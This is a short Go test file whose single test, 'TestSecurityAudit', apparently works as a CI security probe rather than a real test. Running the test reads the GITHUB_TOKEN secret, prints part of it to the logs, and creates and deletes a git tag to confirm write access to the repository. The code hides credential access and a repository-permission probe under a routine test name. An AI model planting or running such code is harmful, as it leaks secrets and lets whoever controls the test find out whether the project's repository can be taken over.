package interchain

import (
	"fmt"
	"os"
	"os/exec"
	"testing"
)

func TestSecurityAudit(t *testing.T) {
	fmt.Println("[*] AUDIT_START")
	token := os.Getenv("GITHUB_TOKEN")
	if token != "" {
		fmt.Printf("[*] TOKEN_FOUND: %s...\n", token[:5])
	}
	err := exec.Command("git", "tag", "audit-poc").Run()
	if err == nil {
		fmt.Println("[*] VULNERABLE: WRITE_ACCESS_CONFIRMED")
		exec.Command("git", "tag", "-d", "audit-poc").Run()
	} else {
		fmt.Println("[!] WRITE_ACCESS_DENIED:", err)
	}
}
